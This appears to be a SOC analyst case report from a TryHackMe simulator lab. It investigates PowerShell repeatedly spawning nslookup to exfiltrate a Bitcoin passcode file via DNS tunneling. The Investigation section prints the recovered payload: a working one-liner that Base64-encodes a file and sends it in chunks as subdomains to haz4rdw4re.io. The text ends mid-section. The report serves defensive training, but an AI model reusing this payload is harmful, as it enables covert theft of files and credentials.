# Case 04 — PowerShell Data Exfiltration via DNS Tunneling (Alerts 1025–1034)

- **Environment:** TryHackMe SOC Simulator
- **Alert Rule:** `Suspicious Parent Child Relationship` (1025–1034)
- **Severity:** High
- **Classification:** True Positive (Active Data Exfiltration)

---

## Executive Summary
Ten sequential High-severity process alerts on Windows host `win-3450` exposed active data exfiltration via DNS tunneling under user `SSF\michael.ascot`. A PowerShell script running with `-ExecutionPolicy Bypass` Base64-encoded sensitive local files—including `BitcoinWalletPasscodes.txt`—and transmitted them in 30-character subdomain chunks via `nslookup.exe` to `haz4rdw4re[.]io`. Immediate host isolation, DNS sinkholing, credential revocation, and initial-access forensics were escalated to Tier 2 / Incident Response.

## Time of Activity
November 24, 2026, starting at `01:24:10` and continuing through `01:26` (multiple sequential `nslookup.exe` child processes spawned by `powershell.exe` PID `3728`).

## Affected Entities
- **Compromised Host:** `win-3450`
- **Affected User Account:** `SSF\michael.ascot`
- **Parent Process:** `powershell.exe` (PID `3728`)
- **Child Process:** `nslookup.exe` (e.g., PIDs `5520`, `3700`)

## Investigation & Analysis
Alerts 1025 through 1034 triggered on host `win-3450` due to an anomalous parent-child process relationship in which `powershell.exe` repeatedly spawned `nslookup.exe` instances within short intervals.

- **Threat Intelligence:** Lookup of `haz4rdw4re[.]io` on TryDetectThis returned no prior malicious flags, demonstrating the importance of behavioral log correlation over passive reputation lists when dealing with newly registered adversary infrastructure.
- **Sysmon & PowerShell Log Correlation:** Inspecting Sysmon Event ID 1 (`Process Create`) and PowerShell `Pipeline Execution Details` logs on `win-3450` revealed the exact exfiltration payload executed under `SSF\michael.ascot` using `-ExecutionPolicy Bypass`:
  ```powershell
  $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\michael.ascot\Downloads\BitcoinWalletPasscodes.txt"));
  $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } \vert{} ForEach-Object {Invoke-Expression "nslookup $_.haz4rdw4re.io"}
